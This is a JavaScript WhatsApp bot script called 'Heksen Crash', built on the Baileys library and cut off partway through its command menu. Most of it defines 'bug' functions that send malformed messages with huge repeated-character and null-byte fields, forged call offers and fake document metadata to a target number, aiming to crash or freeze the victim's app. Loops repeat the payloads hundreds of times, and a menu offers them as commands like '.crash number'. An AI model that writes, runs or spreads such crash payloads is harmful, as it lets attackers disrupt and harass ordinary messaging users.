require('./setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = ciciimup = async (ciciimup, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ciciimup.user.id.split(":")[0] + "@s.whatsapp.net" || ciciimup.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));

const botNumber = await ciciimup.decodeJid(ciciimup.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await ciciimup.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log message show
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Time: ${new Date().toLocaleString()} \n` +
`   ⌬ Message: ${m.body || m.mtype} \n` +
`   ⌬ Name: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
const ciciimupreply = async (teks) => {
  return ciciimup.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        showAdAttribution: false, 
        renderLargerThumbnail: false, 
        title: `HEKSEN͢ V4`,
        body: `🌸 cici clyriné`,
        previewType: "PHOTO", 
        thumbnail: RC,
        sourceUrl: `https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19`,
        mediaUrl: `https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg`
      }
    },
    text: teks
  }, {
    quoted: m
  })
}


const bugres = '*</> processing 🌸🏴‍☠️ </>*'

 // function bug
async function uiKiller(target) {
  await ciciimup.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        url: "https://null.com" +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://ciciimup.com" +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( null )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}
async function cicitzyFC1(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
                },
                footer: {
                  text: "cicitzy.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ cicitzy.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("Bug")} to ${target}`))
}

// FUNCTION FORCE CLOSE 2
async function cicitzyFC2(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
                },
                footer: {
                  text: "cicitzy.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await ciciimup.relayMessage("status@broadcast", msg, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}   
async function DocBug(target) {
 let virtex = "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟";
   ciciimup.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1"),
                                groupMentions: [{ groupJid: "1", groupSubject: "@null" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function LocaBugs(target) {
 await ciciimup.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "@null" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ciciimup.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function stikerNotif(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "@null",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await ciciimup.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function CallFC(target) {
let devices = (
await cicitzy.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`); 

await cicitzy.assertSessions(devices) 

const {
    encodeSignedDeviceIdentity,
    jidEncode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@otaxayun/baileys");
    
    let xnxx = () => {
    let map = {};
    return {
    mutex(key, fn) {
    map[key] ??= { task: Promise.resolve() };
    map[key].task = (async prev => {
    try { await prev; } catch {}
    return fn();
    })(map[key].task);
    return map[key].task;
    }
    };
    };

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = cicitzy.createParticipantNodes.bind(cicitzy);
let yntkts = cicitzy.encodeWAMessage?.bind(cicitzy);
cicitzy.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (cicitzy.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = cicitzy.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await cicitzy.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await cicitzy.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: cicitzy.generateMessageTag(), from: cicitzy.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": cicitzy.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(cicitzy.authState.creds.account, true)
}] : [])
]
}]
};

await cicitzy.sendNode(lemiting);
}

async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"AGLER\",\"tower_number\":\"AGLER\",\"city\":\"@null\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function ForceClose2(target) {
  for (let i = 0; i < 1; i++) {
  const teks = `\`𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟\``+"ꦾ".repeat(550);
  const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg';
  const agler = `\`attack system ${target}\``
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '120363322461279856@newsletter', buttonText:
   {displayText: '𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }
   await ciciimup.relayMessage(target,
   buttonMessage, { participant: { jid: target } });

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: agler
   }, { quoted: m });

  console.log(chalk.blue('attack force close'))
    }
   }

async function CrashGroup(target) {
  for (let i = 0; i < 500; i++) {
  const teks = `\`𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟\``+"ꦾ".repeat(780);
  const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg';
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '.bug-gb', buttonText:
   {displayText: '𐎟😈𝙃𝙚𝙠𝙨𝙚𝙣×𝘾𝙧𝙖𝙨𝙝𒁂𝙗𝙞𝙡𝙡𝙮𝙩𝙯𝙮́͢ 😈⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: teks
   }, { quoted: m });

   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })
  console.log(chalk.blue('attack force close'))
    }
   }

  async function cicitzy1(target) {
    for (let i = 0; i < 100; i++) {
      await uiKiller(target)
      await cicitzyFC1(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await uiKiller(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
     }
    }

    async function cicitzy2(target) {
    for (let i = 0; i < 100; i++) {
      await uiKiller(target)
      await CallFC(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await ForceClose2(target)
      await uiKiller(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
      await ForceClose2(target)
     }
    }


switch (command) {
case 'menu': {
m.reply(`*𝐻𝐸𝐾𝑆𝐸𝑁 𝐶𝑅𝐴𝑆𝐻 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷*`) 
const teks = `
❄ INFORMATION ❄*
*🐉 name :* heksen͢crash
*🐉 username :* ${pushname}
*🐉 version :* 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷
*🐉 generation :* legal

*🌷 bug ➩ menu 🌷*

> 沃 .bugmenu ➩ *—*
> 沃 .buggacor ➩ *—*

*😈 own ➩ menu 😈*
> 沃 .addprem ➩ *number*
> 沃 .delprem ➩ *number*
> 沃 .self ➩ *change bot mode-private*
> 沃 .public ➩ *change boy mode-public*
> 沃 .owner ➩ *—*


`
const image = 'https://raw.githubusercontent.com/xhclintohn/Music-Clips-Collection/main/heksen.jpg';
let buttons = [
     {buttonId: '.bugmenu', buttonText: {displayText: '🌸⃟༑⌁⃰𝐁͢𝐮𝐠 𝐦𝐞𝐧𝐮ͮ͢ཀ͜͡😈'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
//     gifPlayback: true,
     caption: teks,
     buttons: buttons,
     contextInfo: {
       forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363322461279856@newsletter",
             newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡😈"
            }
        },
        footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡😈",
        viewOnce: true,
        headerType: 6
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })
 // batas code button
   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriná.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'bugmenu': {
m.reply(`*𝐻𝐸𝐾𝑆𝐸𝑁 𝐶𝑅𝐴𝑆𝐻 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷*`) 
const teks = `
❄ INFORMATION ❄*
*🐉 name :* heksen͢crash
*🐉 username :* ${pushname}
*🐉 version :* 𝑉𝟺.𝟶𝟻 𝐺𝐸𝑁 𝟷
*🐉 generation :* legal

*🌷 bug ➩ menu 🌷*
> 沃 .heksencrash ➩ *number*
> 沃 .crash ➩ *number*
> 沃 .bug ➩ *number*
> 沃 .kontol-crash ➩ *number*
> 沃 .momok-crash ➩ *number*
> 沃 .bug-group ➩ *—*

*😈 own ➩ menu 😈*
> 沃 .addprem ➩ *number*
